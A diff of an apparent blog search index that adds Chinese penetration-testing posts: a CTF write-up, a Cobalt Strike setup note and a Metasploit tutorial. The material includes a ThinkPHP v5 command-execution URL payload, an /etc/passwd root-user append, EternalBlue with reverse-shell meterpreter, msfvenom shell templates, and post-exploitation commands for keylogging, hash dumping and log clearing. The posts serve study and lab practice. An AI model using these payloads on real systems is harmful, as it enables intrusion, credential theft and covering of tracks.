@@ -689,17 +689,822 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
       </tags>
   </entry>
   <entry>
+    <title>js原型链污染</title>
+    <url>/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>原型对象的学习和污染</p>
+<span id="more"></span>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702180603744.png" alt="image-20230702180603744"></p>
+<p>给出一个登陆界面，看到有注册，有url框，很容易会想到注入和爆破，但是题目要求说了不需要爆破，抓个包看看</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702180815052.png" alt="image-20230702180815052"></p>
+<p>很明显传递了两个参数username和password</p>
+<p>账户密码错误或为空会返回</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702181651762.png" alt="image-20230702181651762"></p>
+<p>检查注册页面</p>
+<p>成功注册</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702181924542.png" alt="image-20230702181924542"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182016261.png" alt="image-20230702182016261"></p>
+<p>注意到还有一个is admin选项</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182128449.png" alt="image-20230702182128449"></p>
+<p>会多出一个invite code选项，并且会前端检查是否填写</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182106478.png" alt="image-20230702182106478"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182211209.png" alt="image-20230702182211209"></p>
+<p>多两个参数，尝试更改参数，但是没有用。nmap进行端口扫描</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182532710.png" alt="image-20230702182532710"></p>
+<p>很多apache服务</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182553404.png" alt="image-20230702182553404"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182706094.png" alt="image-20230702182706094"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182746936.png" alt="image-20230702182746936"></p>
+<p>经典漏洞远程执行</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702183653753.png" alt="image-20230702183653753"></p>
+<p>可能存在文件上传漏洞</p>
+<p>通过端口扫描得到两个可能存在漏洞的页面和一个php代码</p>
+<h2 id="thinkphp-v5"><a href="#thinkphp-v5" class="headerlink" title="thinkphp v5"></a>thinkphp v5</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">构造url：ip/index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span><span class="params">[]</span>=<span class="params">[linux指令]</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702183957488.png" alt="image-20230702183957488"></p>
+<p>得到我们是www-data用户</p>
+<p>nc尝试正向连接与反向连接均失败</p>
+<p>可以创建root权限用户，查看passwd表中书写格式</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702185059204.png" alt="image-20230702185059204"></p>
+<p>openssl生成用户并获得加密后的密码</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt<span class="meta"> [username] [password]</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702185209920.png" alt="image-20230702185209920"></p>
+<p>按照root格式写入passwd文件</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;root:<span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0 <span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>但是被拒绝</p>
+<p>查看系统版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702190107598.png" alt="image-20230702190107598"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702190136068.png" alt="image-20230702190136068"></p>
+<p>找一下有没有合适的exploit</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702191918573.png" alt="image-20230702191918573"></p>
+<p>但是发现无法写入文件也无法切换到tmp下</p>
+<p>尝试定时任务提权也发现并没有可写权限的文件</p>
+<p>目前通过www-data提权方式走不通</p>
+<p>ls看看当前能访问的文件</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192713361.png" alt="image-20230702192713361"></p>
+<p>router.php<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192807453.png" alt="image-20230702192807453"></p>
+<p>index.php<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192902763.png" alt="image-20230702192902763"></p>
+<p>robots.txt<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192934875.png" alt="image-20230702192934875"></p>
+<p>当前路径<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193207392.png" alt="image-20230702193207392"></p>
+<p>没有找到特别有用的信息，看一下文件上传页面，上传正常图片<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193401485.png" alt="image-20230702193401485"></p>
+<p>上传php图片时，而且是前端验证<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193515809.png" alt="image-20230702193515809"></p>
+<p>尝试图片马<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193639916.png" alt="image-20230702193639916"></p>
+<p>存在端口的影响，绝对路径也很难用御剑爆破出来</p>
+<p>wp查看源码，得到是一个原型链污染</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200247737.png" alt="image-20230702200247737"></p>
+<p>就可以了</p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200658611.png" alt="image-20230702200658611"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200727563.png" alt="image-20230702200727563"></p>
+<h1 id="catcat"><a href="#catcat" class="headerlink" title="catcat"></a>catcat</h1><p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200959138.png" alt="image-20230702200959138"></p>
+<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702201012248.png" alt="image-20230702201012248"></p>
+<p>可能存在任意文件读取漏洞</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+        <tag>CATCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C/S安装</title>
+    <url>/2023/07/02/C-S%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>C/S在渗透测试中的应用</p>
+<span id="more"></span>
+<p>使用Cobalt Strike来完成C/S架构</p>
+<p>服务端</p>
+<p><img src="/2023/07/02/C-S%E5%AE%89%E8%A3%85/image-20230702022413530.png" alt="image-20230702022413530"></p>
+<p>客户端</p>
+<p><img src="/2023/07/02/C-S%E5%AE%89%E8%A3%85/image-20230702022529550.png" alt="image-20230702022529550"></p>
+<p>连接</p>
+<p><img src="/2023/07/02/C-S%E5%AE%89%E8%A3%85/image-20230702091003207.png" alt="image-20230702091003207"></p>
+<p>监视器</p>
+<p><img src="/2023/07/02/C-S%E5%AE%89%E8%A3%85/image-20230702091110762.png" alt="image-20230702091110762"></p>
+<p>设置攻击</p>
+<p><img src="/2023/07/02/C-S%E5%AE%89%E8%A3%85/image-20230702093223917.png" alt="image-20230702093223917"></p>
+<p>靶机命令执行后获取shell</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit</title>
+    <url>/2023/07/01/metasploit/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>msf的简单使用</p>
+<span id="more"></span>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一键安装MSF：</span></span><br><span class="line">curl https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/rapid7/m</span>etasploit-omnibus<span class="regexp">/master/</span>config<span class="regexp">/templates/m</span>etasploit-framework-wrappers<span class="regexp">/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./m</span>sfinstall</span><br><span class="line"> </span><br><span class="line">adduser msf                           <span class="comment">#添加msf用户</span></span><br><span class="line">su msf                                <span class="comment">#切换到msf用户</span></span><br><span class="line">cd  <span class="regexp">/opt/m</span>etasploit-framework/bin     <span class="comment">#切换到msf所在的目录 </span></span><br><span class="line">./msfconsole                          <span class="comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了：</span></span><br><span class="line">ln -s <span class="regexp">/opt/m</span>etasploit-framework<span class="regexp">/bin/m</span>sfconsole <span class="regexp">/usr/</span>bin/msfconsole</span><br><span class="line"> </span><br><span class="line"><span class="comment">#备注：</span></span><br><span class="line"><span class="comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。     </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新初始化msf数据库</span></span><br><span class="line">msfdb reinit</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 非kali环境下更新升级MSF：</span></span><br><span class="line">msfupdate							   <span class="comment"># MSF后期的升级</span></span><br><span class="line"><span class="comment"># kali环境下更新升级MSF：</span></span><br><span class="line">apt update 							   <span class="comment"># 更新安装包信息；只检查，不更新</span></span><br><span class="line">apt upgrade 						   <span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade					   <span class="comment"># 升级包，删除旧包</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole										    <span class="comment">#进入框架</span></span><br><span class="line">search  ms17_010                                    <span class="comment"># 使用search命令查找相关漏洞</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        <span class="comment"># 使用use进入模块</span></span><br><span class="line">info     										    <span class="comment">#使用info查看模块信息</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    	<span class="comment">#设置攻击载荷</span></span><br><span class="line">show options    									<span class="comment">#查看模块需要配置的参数</span></span><br><span class="line"><span class="built_in">set</span>  RHOST  192.168.100.158    					    <span class="comment">#设置参数</span></span><br><span class="line">exploit / run     								    <span class="comment">#攻击</span></span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">usr<span class="regexp">/share/m</span>etasploit-framework<span class="regexp">/modules/</span>exploits</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701095010736.png" alt="image-20230701095010736"></p>
+<p>metasploit使用ruby写的，所以文件也都是rb文件</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/m</span>odules/payloads</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701095314178.png" alt="image-20230701095314178"></p>
+<p>Single：<br>  是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似netcat这样的非metasploit处理工具所捕捉到。</p>
+<p>Stager：<br>  这种Payload 负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</p>
+<p>Stage：<br>  是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</p>
+<p>stager中常见的payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">windows<span class="regexp">/meterpreter/</span>bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows<span class="regexp">/meterpreter/</span>reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows<span class="regexp">/meterpreter/</span>reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows<span class="regexp">/meterpreter/</span>reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br></pre></td></tr></table></figure>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">-l, <span class="attr">--list</span> &lt;type&gt; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,.....<span class="selector-class">.all</span></span><br><span class="line">-<span class="selector-tag">p</span>, <span class="attr">--payload</span> &lt; payload&gt; 指定需要使用的<span class="built_in">payload</span>(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的 </span><br><span class="line">-f, <span class="attr">--format</span> &lt; format&gt; 指定输出格式</span><br><span class="line">-e, <span class="attr">--encoder</span> &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line">-<span class="selector-tag">a</span>, <span class="attr">--arch</span> &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</span><br><span class="line">-o, <span class="attr">--out</span> &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line">-<span class="selector-tag">b</span>, <span class="attr">--bad-chars</span> &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 <span class="string">&#x27;\x0f&#x27;</span>、<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">-n, <span class="attr">--nopsled</span> &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line">-s, <span class="attr">--space</span> &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line">-<span class="selector-tag">i</span>, <span class="attr">--iterations</span> &lt; count&gt; 指定payload的编码次数</span><br><span class="line">-c, <span class="attr">--add-code</span> &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line">-x, <span class="attr">--template</span> &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line">-k, <span class="attr">--keep</span> 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">-v, <span class="attr">--var-name</span> &lt; value&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">-t, <span class="attr">--timeout</span> &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为<span class="number">30</span>，<span class="number">0</span>表示禁用）</span><br><span class="line">-h,<span class="attr">--help</span> 查看帮助选项</span><br><span class="line"><span class="attr">--platform</span> &lt; platform&gt; 指定payload的目标平台</span><br></pre></td></tr></table></figure>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">统一格式：msfvenom -<span class="keyword">p</span> [payload] LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port <span class="keyword">to</span> Connect On&gt; -<span class="keyword">f</span></span><br><span class="line">linux：elf &gt; <span class="keyword">shell</span>.elf</span><br><span class="line">windows: <span class="keyword">exe</span> &gt; <span class="keyword">shell</span>.<span class="keyword">exe</span></span><br><span class="line">mac: macho &gt;<span class="keyword">shell</span>.maochoWeb Payloads</span><br><span class="line">php: raw &gt; <span class="keyword">shell</span>.php</span><br><span class="line">asp: asp &gt; <span class="keyword">shell</span>.asp</span><br><span class="line">jsp: raw &gt; <span class="keyword">shell</span>.jsp</span><br><span class="line">war: war &gt; <span class="keyword">shell</span>.war</span><br><span class="line"><span class="keyword">py</span>: raw &gt; <span class="keyword">shell</span>.<span class="keyword">py</span></span><br><span class="line">bash: raw &gt; <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">perl</span>: raw &gt; <span class="keyword">shell</span>.pl</span><br></pre></td></tr></table></figure>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>查找永恒之蓝</p>
+<p><img src="/2023/07/01/metasploit/image-20230701100557122.png" alt="image-20230701100557122"></p>
+<p>查看exp参数设置</p>
+<p><img src="/2023/07/01/metasploit/image-20230701100729361.png" alt="image-20230701100729361"></p>
+<p>设置靶机ip</p>
+<p><img src="/2023/07/01/metasploit/image-20230701103448834.png" alt="image-20230701103448834"></p>
+<p>选择漏洞攻击模块</p>
+<p><img src="/2023/07/01/metasploit/image-20230701103628288.png" alt="image-20230701103628288"></p>
+<p>查看攻击目标版本</p>
+<p><img src="/2023/07/01/metasploit/image-20230701103831144.png" alt="image-20230701103831144"></p>
+<p>查看攻击载荷</p>
+<p><img src="/2023/07/01/metasploit/image-20230701103920505.png" alt="image-20230701103920505"></p>
+<p>设置攻击载荷</p>
+<p><img src="/2023/07/01/metasploit/image-20230701104108234.png" alt="image-20230701104108234"></p>
+<p>配置参数</p>
+<p><img src="/2023/07/01/metasploit/image-20230701104143291.png" alt="image-20230701104143291"></p>
+<p><img src="/2023/07/01/metasploit/image-20230701104238000.png" alt="image-20230701104238000"></p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">Meterpreter</span><br><span class="line"><span class="section">Meterpreter &gt; ?</span></span><br><span class="line"><span class="section">==========================================</span></span><br><span class="line"><span class="section">核心命令：</span></span><br><span class="line"><span class="section">==========================================</span></span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable<span class="emphasis">_unicode_encoding      禁用 unicode 字符串的编码</span></span><br><span class="line"><span class="emphasis">enable_unicode_encoding       启用 unicode 字符串的编码</span></span><br><span class="line"><span class="emphasis">exit                          终止 Meterpreter 会话</span></span><br><span class="line"><span class="emphasis">get_timeouts                  获取当前会话超时值</span></span><br><span class="line"><span class="emphasis">guid                          获取会话 GUID</span></span><br><span class="line"><span class="emphasis">help                          帮助菜单</span></span><br><span class="line"><span class="emphasis">info                          显示有关 Post 模块的信息</span></span><br><span class="line"><span class="emphasis">irb                           在当前会话中打开一个交互式 Ruby shell</span></span><br><span class="line"><span class="emphasis">load                          加载一个或多个 Meterpreter 扩展</span></span><br><span class="line"><span class="emphasis">machine_id                    获取连接到会话的机器的 MSF ID</span></span><br><span class="line"><span class="emphasis">migrate                       将服务器迁移到另一个进程</span></span><br><span class="line"><span class="emphasis">pivot                         管理枢轴侦听器</span></span><br><span class="line"><span class="emphasis">pry                           在当前会话上打开 Pry 调试器</span></span><br><span class="line"><span class="emphasis">quit                          终止 Meterpreter 会话</span></span><br><span class="line"><span class="emphasis">read                          从通道读取数据</span></span><br><span class="line"><span class="emphasis">resource                      运行存储在文件中的命令</span></span><br><span class="line"><span class="emphasis">run                           执行一个 Meterpreter 脚本或 Post 模块</span></span><br><span class="line"><span class="emphasis">secure                       （重新）协商会话上的 TLV 数据包加密</span></span><br><span class="line"><span class="emphasis">sessions                      快速切换到另一个会话</span></span><br><span class="line"><span class="emphasis">set_timeouts                  设置当前会话超时值</span></span><br><span class="line"><span class="emphasis">sleep                         强制 Meterpreter 安静，然后重新建立会话</span></span><br><span class="line"><span class="emphasis">ssl_</span>verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop<span class="emphasis">_token                    放弃任何活动的模拟令牌。</span></span><br><span class="line"><span class="emphasis">execute                       执行命令</span></span><br><span class="line"><span class="emphasis">getenv                        获取一个或多个环境变量值</span></span><br><span class="line"><span class="emphasis">getpid                        获取当前进程标识符</span></span><br><span class="line"><span class="emphasis">getprivs                      尝试启用当前进程可用的所有权限</span></span><br><span class="line"><span class="emphasis">getid                         获取服务器运行的用户的 SID</span></span><br><span class="line"><span class="emphasis">getuid                        获取服务器运行的用户</span></span><br><span class="line"><span class="emphasis">kill                          终止进程</span></span><br><span class="line"><span class="emphasis">localtime                     显示目标系统本地日期和时间</span></span><br><span class="line"><span class="emphasis">pgrep                         按名称过滤进程</span></span><br><span class="line"><span class="emphasis">pkill                         按名称终止进程</span></span><br><span class="line"><span class="emphasis">ps                            列出正在运行的进程</span></span><br><span class="line"><span class="emphasis">reboot                        重启远程计算机</span></span><br><span class="line"><span class="emphasis">reg                           修改远程注册表并与之交互</span></span><br><span class="line"><span class="emphasis">rev2self                      在远程机器上调用 RevertToSelf()</span></span><br><span class="line"><span class="emphasis">shell                         放入系统命令 shell</span></span><br><span class="line"><span class="emphasis">shutdown                      关闭远程计算机</span></span><br><span class="line"><span class="emphasis">steal_</span>token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard<span class="emphasis">_send                 发送击键</span></span><br><span class="line"><span class="emphasis">keyevent                      发送按键事件</span></span><br><span class="line"><span class="emphasis">keyscan_dump                  转储击键缓冲区</span></span><br><span class="line"><span class="emphasis">keyscan_start                 开始捕获击键</span></span><br><span class="line"><span class="emphasis">keyscan_</span>stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">record<span class="emphasis">_mic                    从默认麦克风录制音频 X 秒</span></span><br><span class="line"><span class="emphasis">webcam_chat                   开始视频聊天</span></span><br><span class="line"><span class="emphasis">webcam_list                   列出网络摄像头</span></span><br><span class="line"><span class="emphasis">webcam_snap                   从指定的网络摄像头拍摄快照</span></span><br><span class="line"><span class="emphasis">webcam_</span>stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line"><span class="bullet">-------                       </span>------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br></pre></td></tr></table></figure>
